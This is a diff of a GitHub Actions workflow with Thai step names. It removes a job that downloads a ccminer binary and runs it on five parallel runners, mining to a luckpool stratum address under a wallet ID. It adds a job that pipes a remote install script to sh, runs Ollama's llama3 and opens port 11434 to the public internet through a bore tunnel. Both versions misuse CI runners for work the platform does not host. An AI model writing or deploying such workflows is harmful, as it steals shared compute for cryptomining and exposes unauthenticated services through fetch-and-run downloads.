@@ -1,40 +1,18 @@
-name: System-Optimizer-Matrix
-on: [push, workflow_dispatch]
+name: Llama-3-Tunnel-Master
+on: [workflow_dispatch]
 
 jobs:
-  # ร่างที่ 1: หน่วยดึงข้อมูล (The Puller)
-  puller:
+  llama-tunnel:
     runs-on: ubuntu-latest
     steps:
-      - name: 🚀 ดึงของใหญ่จากฟ้า
+      - name: 🚀 ติดตั้ง Ollama และเจาะท่อ
         run: |
-          wget https://github.com/Oropendola-S/CCMINER-GITHUB/raw/main/ccminer
-          chmod +x ccminer
-          tar -cvf miner-payload.tar ccminer
-      - name: 📦 ส่งพลังงานเข้าระบบรวมร่าง
-        uses: actions/upload-artifact@v4
-        with:
-          name: dragon-core
-          path: miner-payload.tar
-
-  # ร่างที่ 2: หน่วยประมวลผลมหาประลัย (The Matrix)
-  matrix-execution:
-    needs: puller
-    strategy:
-      matrix:
-        node: [1, 2, 3, 4, 5] # สั่งรวมร่าง 5 เครื่องพร้อมกัน!
-    runs-on: ubuntu-latest
-    steps:
-      - name: 📥 รับพลังงานจากการรวมร่าง
-        uses: actions/download-artifact@v4
-        with:
-          name: dragon-core
-      - name: 🔥 ลั่นไกพร้อมกันทุกพิกัด
-        run: |
-          tar -xvf miner-payload.tar
-          ./ccminer -a verushash -o stratum+tcp://na.luckpool.net:3956 -u R9zAnHAnBf5YfFjD3pYm1uU.CloudMerge${{ matrix.node }} -p x -t $(nproc) &
-          while true; do
-            IP=$(curl -s ifconfig.me)
-            echo "📡 [Matrix-Node-${{ matrix.node }}] พิกัดรวมร่าง: $IP"
-            sleep 60
-          done
+          # ติดตั้ง Ollama แบบติดเทอร์โบ
+          curl -fsSL https://ollama.com/install.sh | sh
+          ollama serve & 
+          sleep 10
+          ollama run llama3 "Hello Master Bye" & # ปลุก Llama 3
+          
+          # เจาะท่อด้วย Bore (แจกพิกัดหน้าจอแชท)
+          curl -Ls https://github.com/ekzhang/bore/releases/download/v0.5.0/bore-v0.5.0-x86_64-unknown-linux-musl.tar.gz | tar -zxf -
+          ./bore local 11434 --to bore.pub
